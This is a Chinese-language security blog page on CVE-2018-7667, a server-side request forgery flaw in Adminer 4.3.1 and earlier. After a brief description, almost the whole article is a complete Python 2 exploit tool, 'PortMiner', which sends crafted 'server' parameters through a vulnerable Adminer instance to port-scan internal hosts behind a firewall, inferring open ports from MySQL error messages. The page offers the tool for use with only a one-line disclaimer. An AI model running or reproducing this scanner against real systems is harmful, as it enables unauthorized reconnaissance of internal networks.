<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2018-7667）Adminer 服务器端请求伪造漏洞一、漏洞简介Adminer4.3.1及之前版本存在服务器端请求伪造漏洞。攻击者可借助’server’参数利用该漏洞绕过防火墙，确定内部主机，扫描其他服务器的端口。 二、漏洞影响Adminer&lt;&#x3D;4.3.1 三、复现过程pocimport socket,re,ssl,warnings,subprocess,time from p">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Adminer/%EF%BC%88CVE-2018-7667%EF%BC%89Adminer%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2018-7667）Adminer 服务器端请求伪造漏洞一、漏洞简介Adminer4.3.1及之前版本存在服务器端请求伪造漏洞。攻击者可借助’server’参数利用该漏洞绕过防火墙，确定内部主机，扫描其他服务器的端口。 二、漏洞影响Adminer&lt;&#x3D;4.3.1 三、复现过程pocimport socket,re,ssl,warnings,subprocess,time from p">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:25:51.888Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Adminer/（CVE-2018-7667）Adminer服务器端请求伪造漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Adminer/%EF%BC%88CVE-2018-7667%EF%BC%89Adminer%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.888Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-7667）Adminer-服务器端请求伪造漏洞"><a href="#（CVE-2018-7667）Adminer-服务器端请求伪造漏洞" class="headerlink" title="（CVE-2018-7667）Adminer 服务器端请求伪造漏洞"></a>（CVE-2018-7667）Adminer 服务器端请求伪造漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Adminer<br>4.3.1及之前版本存在服务器端请求伪造漏洞。攻击者可借助’server’参数利用该漏洞绕过防火墙，确定内部主机，扫描其他服务器的端口。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Adminer&lt;=4.3.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>import socket,re,ssl,warnings,subprocess,time
from platform import system as system_name 
from os import system as system_call

#Adminer Server Side Request Forgery
#PortMiner Scanner Tool
#by John Page (hyp3rlinx)
#ISR: ApparitionSec
#hyp3rlinx.altervista.org 
#=========================
#D1rty0Tis says hi.

#timeout
MAX_TIME=32
#ports to log
port_lst=[]  
#Web server response often times out but usually means ports open.
false_pos_ports=[&#39;80&#39;,&#39;443&#39;] 

BANNER=&#39;&#39;&#39;
           ____            _   __  __ _                  
          |  _  \         | | |  \/  (_)                 
          | |__) |__  _ __| |_| \  / |_ _ __   ___ _ __  
          |  ___/ _ \| &#39;__| __| |\/| | | &#39;_ \ / _ \ &#39;__| 
          | |  | (_) | |  | |_| |  | | | | | |  __/ |    
          |_|   \___/|_|   \__|_|  |_|_|_| |_|\___|_|                                                                                                             
       &#39;&#39;&#39;                               
   

def info():
    print &quot;\nPortMiner depends on Error messages to determine open/closed ports.&quot;
    print &quot;Read operations reported &#39;timed out&#39; may be open/filtered.\n&quot;


def greet():
    print &#39;Adminer Unauthenticated SSRF Port Scanner Tool&#39;
    print &#39;Targets Adminer used for MySQL administration\n&#39;
    print &#39;by hyp3rlinx - apparition security&#39;
    print &#39;-----------------------------------------------------\n&#39;
    print &#39;Scan small ranges or single ports or expect to wait.\n&#39;
    print &#39;Do not scan networks without authorized permission.&#39;
    print &#39;Author not responsible for abuse/misuse.\n&#39;

    
def chk_ports(p): 
    p=p.replace(&#39;-&#39;,&#39;,&#39;)
    port_arg=p.split(&#39;,&#39;)
    try:
        if len(port_arg)&gt;1:
            if int(port_arg[1]) &lt; int(port_arg[0]):
                print &#39;Port range not valid.&#39;
                raw_input()
                return
            if int(port_arg[1])&gt;65535:
                print &#39;Exceeded max Port range 65535.&#39;
                raw_input()
                return
    except Exception as e:
        print str(e)
        return None
    return list(range(int(port_arg[0]),int(port_arg[1])+1))



def log(IP):
    try:
        file=open(&#39;PortMiner.txt&#39;, &#39;w&#39;)
        file.write(IP+&#39;\n&#39;)
        for p in port_lst:
            file.write(p+&#39;\n&#39;)
        file.close()
    except Exception as e:
        print str(e)
    print &quot;\nSee PortMiner.txt&quot;


def use_ssl(ADMINER,ADMINER_PORT):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ADMINER,int(ADMINER_PORT)))
        s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
        s.close()
    except Exception as e:
        print &quot;&quot;
        return False
    return True


def version(ip,port,uri,use_ssl):
    res=&quot;&quot;
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,int(port)))
        if use_ssl:
            s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) 
        s.send(&#39;GET &#39;+&#39;/&#39;+uri+&#39;/?server=&#39;+&#39;:&#39;+&#39;&amp;username=\r\n\r\n&#39;)

    except Exception as e:
        print &#39;Host up but cant connect.&#39; #str(e)
        print &#39;Re-check Host/Port/URI.&#39;
        s.close()
        return 504
     
    while True:
        RES=s.recv(512)
        if RES.find(&#39;Forbidden&#39;)!=-1:
            print &#39;Forbidden 403&#39;
            s.close()
            return None
        if RES.find(&#39;401 Authorization Required&#39;)!=-1:
            print &#39;401 Authorization Required&#39;
            s.close()
            return None
        ver = re.findall(r&#39;&lt;span&gt;(.*)&lt;/span&gt;&#39;,RES,re.DOTALL|re.MULTILINE)
        if not RES:
            s.close()
            return None
        if ver:
            print &#39;Your Adminer &#39;+ ver[0] + &#39; works for us now.&#39;
            s.close()
            return ver

    s.close()
    return None
 
       
               
def scan(ADMINER,ADMINER_PORT,ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL):
    global MAX_TIME,port_range
    RES=&#39;&#39;

    print &#39;scanning ports: %s &#39; % str(port_range[0])+&#39;to &#39; + str(port_range[-1])+&#39; ...&#39;
    
    for aPort in port_range: 
         aPort=str(aPort)
         
         try:
             s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(MAX_TIME)
             s.connect((ADMINER,ADMINER_PORT))
    
             if USE_SSL:
                s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) 

             s.send(&#39;GET /&#39;+ADMINER_URI+&#39;/?server=&#39;+TARGET+&#39;:&#39;+aPort+&#39;&amp;username= HTTP/1.1\r\nHost: &#39;+TARGET+&#39;\r\n\r\n&#39;)
    
         except Exception as e:
              print str(e)
              s.close()
              return

         while True:
              try:
                 RES=s.recv(512)
                 ###print RES
                 ###Should see HTTP/1.1 403 not 200
                 if RES.find(&#39;HTTP/1.1 200 OK&#39;)!=-1:
                     print &#39;port &#39;+aPort +  &#39; open&#39;
                     port_lst.append(aPort+&#39; open&#39;)
                     s.close()
                     break
                    
                 if RES.find(&#39;400 Bad Request&#39;)!=-1:
                     print &#39;400 Bad Request, check params&#39;
                     s.close()
                     break
                     raw_input()                  

                 lst=re.findall(r&quot;([^\n&lt;div&gt;].*connect to MySQL server on.*[^&lt;/div&gt;\n])|(Lost connection to MySQL server at.*)|(MySQL server has gone away.*)&quot;+
                             &quot;|(No connection could be made because the target machine actively refused it.*)|(A connection attempt failed.*)|(HTTP/1.1 200 OK.*)&quot;, RES)     
        
                 if lst:
                      status=str(lst)
                      if status.find(&#39;connect to MySQL&#39;)!=-1:
                          if PRINT_CLOSED:
                              print &#39;port &#39;+ aPort +  &#39; closed&#39;
                          s.close()
                          break
                      elif status.find(&#39;machine actively refused it.&#39;)!=-1:
                          if PRINT_CLOSED:
                              print &#39;port &#39;+ aPort +  &#39; closed&#39;
                          s.close()
                          break
                      elif status.find(&#39;A connection attempt failed&#39;)!=-1:
                          if PRINT_CLOSED:
                               print &#39;port &#39;+ aPort +  &#39; closed&#39;
                          s.close()
                          break
                      elif status.find(&#39;reading initial communication packet&#39;)!=-1:
                          print &#39;port &#39;+aPort +  &#39; open&#39;
                          port_lst.append(aPort+&#39; open&#39;)
                          s.close()
                          break
                      elif status.find(&#39;MySQL server has gone away&#39;)!=-1:
                          print &#39;port &#39;+aPort +  &#39; open&#39;
                          port_lst.append(aPort+&#39; open&#39;)
                          s.close()
                          break
                      elif status.find(&#39;Bad file descriptor&#39;)!=-1:
                          print &#39;port &#39;+aPort +  &#39; open&#39;
                          port_lst.append(aPort+&#39; open&#39;)
                          s.close()
                          break
                      elif status.find(&#39;Got packets out of order&#39;)!=-1:
                          print &#39;port &#39;+aPort +  &#39; open&#39;
                          s.close()
                          break
                        
              except Exception  as e:
                  msg = str(e)
                  ###print msg
                  if msg.find(&#39;timed out&#39;)!=-1 and aPort in false_pos_ports:
                      print &#39;port &#39;+aPort +  &#39; open&#39;
                      port_lst.append(aPort+&#39; open&#39;)
                      s.close()
                      break
                  elif msg.find(&#39;timed out&#39;)!=-1: 
                      print &#39;port &#39;+aPort + &#39; timed out&#39;
                      port_lst.append(aPort+&#39; read operation timed out&#39;)
                      s.close()
                      break
                  else:
                      s.close()
                      break
               
    if port_lst:
        log(TARGET)
    else:
        print &quot;Scan completed, no ports mined.&quot;
    return 0



def arp(host):
    args = &quot;-a&quot; if system_name().lower()==&quot;windows&quot; else &quot;-e&quot;
    return subprocess.call(&quot;arp &quot; + args + &quot; &quot; + host, shell=True) == 0
         

def ping_host(host):
    args = &quot;-n 1&quot; if system_name().lower()==&quot;windows&quot; else &quot;-c 1&quot;
    res=subprocess.call(&quot;ping &quot; + args + &quot; &quot; + host, shell=True) == 0
    if not res:
        print str(host) + &#39; down? trying ARP&#39;
        if not arp(host):
            print str(host) + &#39; unreachable.&#39;
            return
    return res

    

def main():
    global port_range
    print BANNER
    greet()
    ADMINER_VERSION=False
    PRINT_CLOSED=False
    USE_SSL=None

    ADMINER=raw_input(&#39;[+] Adminer Host/IP&gt; &#39;)
    if ADMINER==&#39;&#39;:
        print &#39;Enter valid Host/IP&#39;
        ADMINER=raw_input(&#39;[+] Adminer Host/IP&gt; &#39;)
    
    ADMINER_PORT=raw_input(&#39;[+] Adminer Port&gt; &#39;)
    if not re.search(&quot;^\d&#123;1,5&#125;$&quot;,ADMINER_PORT):
        print &#39;Enter a valid Port.&#39;
        ADMINER_PORT=raw_input(&#39;[+] Adminer Port&gt; &#39;)
    
    ADMINER_URI=raw_input(&#39;[+] Adminer URI [the adminer-&lt;version&gt;.php OR adminer/ dir path] &gt; &#39;)
    TARGET=raw_input(&#39;[+] Host/IP to Scan&gt; &#39;)
    
    PORTS_TO_SCAN=raw_input(&#39;[+] Port Range e.g. 21-25&gt; &#39;).replace(&#39; &#39;,&#39;&#39;)
    plst=re.findall(r&quot;(\d&#123;1,5&#125;)-(\d&#123;1,5&#125;)&quot;,PORTS_TO_SCAN)
    if not plst:
        print &#39;Invalid ports, format is 1-1025&#39;
        return
        raw_input() #console up

    port_range=chk_ports(PORTS_TO_SCAN)
    if not port_range:
        return

    PRINT_CLOSED=raw_input(&#39;[+] Print closed ports? 1=Yes any key for No&gt; &#39;)
    if PRINT_CLOSED==&#39;1&#39;:
        PRINT_CLOSED=True
    else:
        PRINT_CLOSED=False
    
    if not ping_host(ADMINER):
        print &#39;host %s not reachable or blocking ping &#39; % ADMINER  
        cont=raw_input(&#39;Continue with scan? 1=Yes any key for No&gt; &#39;)
        if cont!=&#39;1&#39;:
            print &#39;Scan aborted.&#39;
            raw_input() #console up
            return
        

    USE_SSL=use_ssl(ADMINER,ADMINER_PORT)
    time.sleep(2)
    ADMINER_VERSION = version(ADMINER,ADMINER_PORT,ADMINER_URI,USE_SSL)

    if not ADMINER_VERSION:
        print &quot;Can&#39;t retrieve Adminer script. check supplied URI.&quot;
        raw_input() #console up
        return
    else:
        if ADMINER_VERSION==504:
            raw_input() #console up
            return
        if scan(ADMINER,int(ADMINER_PORT),ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL)==0:
            more=raw_input(&#39;Info: 1=Yes, any key for No&gt; &#39;)
            if more==&#39;1&#39;:
                info()
                raw_input() #console up

    
if __name__==&#39;__main__&#39;:
    main()
</code></pre>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Adminer/%EF%BC%88CVE-2018-7667%EF%BC%89Adminer%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlid000wy8v1hl23ay1p" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Adobe%20ColdFusion/%EF%BC%88CVE-2010-2861%EF%BC%89Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Adminer/Adminers%201.1.3%20%EF%BC%88SQLite%203%20%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>